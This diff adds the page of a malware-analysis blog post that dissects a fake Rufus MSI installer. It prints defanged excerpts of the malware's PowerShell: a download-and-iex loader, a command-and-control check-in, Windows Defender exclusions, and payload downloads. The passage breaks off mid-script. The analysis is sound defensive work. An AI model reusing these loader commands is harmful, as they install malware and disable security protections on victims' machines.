@@ -1,0 +1,467 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BATLoader, Ursnif, and Redline, oh my!" /><meta property="og:locale" content="en" /><meta name="description" content="Earlier today, @MalwareHunterTeam posted on Twitter about a malicious MSI file masquerading as a Rufus installer." /><meta property="og:description" content="Earlier today, @MalwareHunterTeam posted on Twitter about a malicious MSI file masquerading as a Rufus installer." /><link rel="canonical" href="https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/" /><meta property="og:url" content="https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-23T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="BATLoader, Ursnif, and Redline, oh my!" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-23T00:00:00+00:00","datePublished":"2023-01-23T00:00:00+00:00","description":"Earlier today, @MalwareHunterTeam posted on Twitter about a malicious MSI file masquerading as a Rufus installer.","headline":"BATLoader, Ursnif, and Redline, oh my!","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/"},"url":"https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/"}</script><title>BATLoader, Ursnif, and Redline, oh my! | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>BATLoader, Ursnif, and Redline, oh my!</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>BATLoader, Ursnif, and Redline, oh my!</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1674432000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-01-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2116 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>Earlier today, <a href="https://twitter.com/malwrhunterteam">@MalwareHunterTeam</a> posted on Twitter about a malicious MSI file masquerading as a Rufus installer.</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">Searching for &quot;rufus&quot; in Google right now gives 2 ads that are obviously not the official Rufus.<br />2nd one redirect: https://rufus-download[.]software/download-index1.html<br />Download: https://extremebot[.]software/Rufus_3.21.msi<br />Same gang: <a href="https://t.co/6spGIxTwbM">https://t.co/6spGIxTwbM</a><br />cc <a href="https://twitter.com/1ZRR4H?ref_src=twsrc%5Etfw">@1ZRR4H</a> <a href="https://twitter.com/wdormann?ref_src=twsrc%5Etfw">@wdormann</a> <a href="https://t.co/K02Vs2Q50Z">pic.twitter.com/K02Vs2Q50Z</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1617608510279405569?ref_src=twsrc%5Etfw">January 23, 2023</a></blockquote><script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>I thought it sounded interesting so I gave analysis a try on the MSI file. If you want to follow along at home, the MSI sample is here: <a href="https://bazaar.abuse.ch/sample/41eb889a36b3dbe09fe700cedaff17317a451b3b1038fdd54103491bb882fcb7/">https://bazaar.abuse.ch/sample/41eb889a36b3dbe09fe700cedaff17317a451b3b1038fdd54103491bb882fcb7/</a>.</p><h2 id="msi-triage-and-unpacking"><span class="mr-2">MSI Triage and Unpacking</span><a href="#msi-triage-and-unpacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Our first few steps on the MSI file are easy. We can verify the file is a MSI using <code class="language-plaintext highlighter-rouge">file</code> and we can unpack the MSI content using <code class="language-plaintext highlighter-rouge">msidump</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>file rufus.msi 
+<span class="gp">rufus.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 932, Title: Installation Database, Subject: Rufus, Author: Rufus Company, Keywords: Installer, MSI, Database, Comments: CXg[f[^x[X Rufus CXg[KvWbNf[^B, Create Time/Date: Fri Dec 11 11:47:46 2009, Name of Creating Application: Advanced Installer 17.1.2 build 64c1c160, Security: 0, Template: ;</span>1033, Last Saved By: <span class="p">;</span>1041, Revision Number: <span class="o">{</span>708B6830-05FC-48E1-8E9F-E648707AE954<span class="o">}</span>3.21<span class="p">;</span><span class="o">{</span>708B6830-05FC-48E1-8E9F-E648707AE954<span class="o">}</span>3.21<span class="p">;</span><span class="o">{</span>EA9EC272-22B1-45F2-901B-2713DE6F459B<span class="o">}</span>, Number of Pages: 200, Number of Characters: 63
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">file</code> command confirms we do indeed have a MSI file, and the properties of the MSI indicate it was created using <a href="https://www.advancedinstaller.com/">Advanced Installer</a>. We can corroborate this data by keeping an eye on what binary file streams get extracted from the MSI.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>msidump <span class="nt">-s</span> <span class="nt">-t</span> <span class="nt">-S</span> rufus.msi 
+<span class="go">Exporting table _SummaryInformation...
+Exporting table _ForceCodepage...
+Exporting table AdminExecuteSequence...
+Exporting table Condition...
+Exporting table AdvtExecuteSequence...
+</span><span class="c">...
+</span><span class="go">Exporting table Directory...
+Exporting table CustomAction...
+</span><span class="c">...
+</span><span class="go">Exporting stream Binary.aicustact.dll...
+Exporting stream Binary.cmdlinkarrow...
+Exporting stream Binary.SoftwareDetector.dll...
+Exporting stream Binary.PowerShellScriptLauncher.dll...
+</span><span class="c">...
+</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Binary.aicustact.dll</code> and <code class="language-plaintext highlighter-rouge">Binary.PowerShellScriptLauncher.dll</code> files are commonly seen with Advanced Installer MSI packages, and they even carry the proper Advanced Installer signature.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>pedump <span class="nt">--security</span> Binary/Binary.aicustact.dll
+<span class="go">
+=== SECURITY ===
+
+</span><span class="c">...
+</span><span class="go">
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            79:7d:59:66:04:91:55:be:bf:38:3f:fb:0b:e3:29:10
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=US, O=thawte, Inc., CN=thawte SHA256 Code Signing CA
+        Validity
+            Not Before: Mar  6 00:00:00 2020 GMT
+            Not After : Mar  5 23:59:59 2023 GMT
+        Subject: C=RO, ST=Dolj, L=Craiova, O=Caphyon SRL, OU=SECURE APPLICATION DEVELOPMENT, CN=Caphyon SRL
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Since <code class="language-plaintext highlighter-rouge">Binary.PowerShellScriptLauncher.dll</code> is in here, there’s a decent chance that our MSI CustomAction table has some PowerShell code within. Let’s go take a look!</p><h2 id="msi-customaction-and-powershell"><span class="mr-2">MSI CustomAction and PowerShell</span><a href="#msi-customaction-and-powershell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Looking into the dumped CustomAction table, we can see some potentially malicious code.</p><div file="CustomAction.idt" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="CustomAction.idt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+
+</span><span class="n">sleep</span><span class="w"> </span><span class="nt">-Milliseconds</span><span class="w"> </span><span class="nx">241</span><span class="w">
+</span><span class="p">[</span><span class="n">\</span><span class="p">[]</span><span class="nx">Net.ServicePointManager</span><span class="p">[</span><span class="n">\</span><span class="p">]]::</span><span class="nx">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">\</span><span class="p">[]</span><span class="nx">Net.SecurityProtocolType</span><span class="p">[</span><span class="n">\</span><span class="p">]]::</span><span class="nx">Tls12</span><span class="w">
+</span><span class="p">(</span><span class="n">new</span><span class="nt">-object</span><span class="w"> </span><span class="n">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"hxxps://aimp[.]software/rufus.gpg"</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iex</span><span class="w">
+
+</span><span class="o">...</span><span class="w">
+
+</span></pre></table></code></div></div><p>This chunk of code downloads additional PowerShell code and executes it using PowerShell’s Invoke-Expression cmdlet. The additional code is obfuscated and fairly long. I’ve cut down the base64 a lot here because we’ll go over the decoded version in pieces as we go. For the decoded script, I’ll refer to that filename as <code class="language-plaintext highlighter-rouge">rufus.decoded.ps1</code>.</p><div file="rufus.gpg" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.gpg"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">DQAKAHMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAAxADIAMwA1AA0ACgAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBl</span><span class="w"> </span><span class="o">...</span><span class="w"> </span><span class="nx">AKQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKAEMAbABlAGEAcgAtAEgAaQBzAHQAbwByAHkAIAANAAoADQAKAA</span><span class="o">==</span><span class="w">
+</span></pre></table></code></div></div><p>After decoding the base64 command with CyberChef we can examine the PowerShell code executed in multiple parts. First, the script calls home to command and control before configuring Windows Defender exclusions.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="n">sleep</span><span class="w"> </span><span class="nt">-Milliseconds</span><span class="w"> </span><span class="nx">1235</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Stop'</span><span class="w">
+</span><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.SecurityProtocolType</span><span class="p">]::</span><span class="n">Tls12</span><span class="w">
+</span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="p">(</span><span class="s2">"hxxps://advertising-check[.]ru/start.php"</span><span class="p">)</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Continue'</span><span class="w">
+
+</span><span class="n">Add-MpPrefer</span><span class="se">`e</span><span class="nx">nce</span><span class="w"> </span><span class="nt">-ExclusionExtension</span><span class="w"> </span><span class="s2">".dll"</span><span class="p">,</span><span class="w"> </span><span class="s2">".cmd"</span><span class="p">,</span><span class="w"> </span><span class="s2">".bat"</span><span class="p">,</span><span class="w"> </span><span class="s2">".zip"</span><span class="p">,</span><span class="w"> </span><span class="s2">".exe"</span><span class="w">
+</span><span class="n">Add-MpPrefer</span><span class="se">`e</span><span class="nx">nce</span><span class="w"> </span><span class="nt">-ExclusionPath</span><span class="w"> </span><span class="s2">"C:\Windows\System32\drivers\etc"</span><span class="p">,</span><span class="w"> </span><span class="s2">"C:\Windows\System32\Config"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">"</span><span class="w">
+</span><span class="n">Add-MpPrefer</span><span class="se">`e</span><span class="nx">nce</span><span class="w"> </span><span class="nt">-ExclusionProcess</span><span class="w"> </span><span class="s2">"Zeip.dll"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Zeip.exe"</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>The Windows Defender exclusions include files with the extensions DLL, CMD, BAT, ZIP, and EXE. The paths include C:\Windows\System32\drivers\etc, C:\Windows\System32\Config, and the current user’s AppData\Roaming folder. Finally, it adds process exclusions specifically for Zeip.dll and Zeip.exe. This detail is going to be useful as the files get downloaded later in the script.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Stop'</span><span class="w">
+</span><span class="n">Invoke-WebRe</span><span class="se">`q</span><span class="nx">uest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="p">(</span><span class="s2">"hxxps://bitbucket[.]org/assop/test/downloads/Zeip.dll.gpg"</span><span class="p">)</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="n">\Zeip.dll.gpg</span><span class="w">
+</span><span class="nx">Invoke-WebRe</span><span class="se">`q</span><span class="nx">uest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="p">(</span><span class="s2">"hxxps://bitbucket[.]org/assop/test/downloads/Zeip.exe.gpg"</span><span class="p">)</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="n">\Zeip.exe.gpg</span><span class="w">
+</span><span class="bp">$Error</span><span class="nx">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Continue'</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>Both Zeip.dll and Zeip.exe are downloaded, but they’re not in executable form yet. If we examine their file type, it looks like they’re both GPG encrypted with AES256.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>file Zeip.exe.gpg 
+<span class="go">Zeip.exe.gpg: GPG symmetrically encrypted data (AES256 cipher)
+</span></pre></table></code></div></div><p>Presumably, the files must be decrypted before they can execute. That portion comes much later in the script, so we’ll keep going until we get to it.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+</span><span class="n">sleep</span><span class="w"> </span><span class="nt">-Milliseconds</span><span class="w"> </span><span class="nx">245</span><span class="w">
+</span><span class="n">Invoke-Web</span><span class="se">`R</span><span class="nx">equest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">hxxps://raw.githubusercontent</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="nx">com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="nx">\NSudo.exe</span><span class="w">
+</span><span class="n">sleep</span><span class="w"> </span><span class="nt">-Milliseconds</span><span class="w"> </span><span class="nx">245</span><span class="w">
+
+</span><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.SecurityProtocolType</span><span class="p">]::</span><span class="n">Tls12</span><span class="w">
+</span><span class="nv">$WebClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
+</span><span class="nv">$WebClient</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s2">"hxxps://github[.]com/pbatard/rufus/releases/download/v3.21/rufus-3.21.exe"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">\setup.exe"</span><span class="p">)</span><span class="w">
+
+</span><span class="o">.</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="n">\setup.exe</span><span class="w">
+
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>This chunk of code does two things. After a sleep delay, it downloads NSudo and the legitimate Rufus installer before installing Rufus. The NSudo executable is often used by <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.bat_loader">BATLoader</a>/Zloader to execute commands with escalated privileges and break up process execution trees. The legitimate Rufus installer is likely to complete the Rufus installation ruse. The malware authors don’t want the victim to get suspicious because Rufus wasn’t installed as requested.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">Install-GnuPg</span><span class="w"> </span><span class="p">{</span><span class="w">
+
+  </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span><span class="w">
+
+  </span><span class="kr">param</span><span class="w">
+  </span><span class="p">(</span><span class="w">
+
+    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">)]</span><span class="w">
+    </span><span class="p">[</span><span class="n">ValidateNotNullOrEmpty</span><span class="p">()]</span><span class="w">
+    </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$DownloadFolderPath</span><span class="p">,</span><span class="w">
+    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">()]</span><span class="w">
+    </span><span class="p">[</span><span class="n">ValidateNotNullOrEmpty</span><span class="p">()]</span><span class="w">
+       
+    </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$DownloadUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'hxxp://files.gpg4win[.]org/gpg4win-2.2.5.exe'</span><span class="w">
+    </span><span class="p">)</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>The actual code to implement GPG functionality starts at this point in the script. It looks like the script implements the <code class="language-plaintext highlighter-rouge">Install-GnuPg</code>, <code class="language-plaintext highlighter-rouge">Add-Encryption</code>, and <code class="language-plaintext highlighter-rouge">Remove-Encryption</code> cmdlets. From some cursory Googling, it looks like these functions are ripped straight from someone’s Github repository: <a href="https://github.com/adbertram/Random-PowerShell-Work/blob/master/Security/GnuPg.psm1">https://github.com/adbertram/Random-PowerShell-Work/blob/master/Security/GnuPg.psm1</a></p><p>Finally we can get into the decryption part of the script.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+</span><span class="n">Install-GnuPG</span><span class="w"> </span><span class="nt">-DownloadFolderPath</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="w">
+
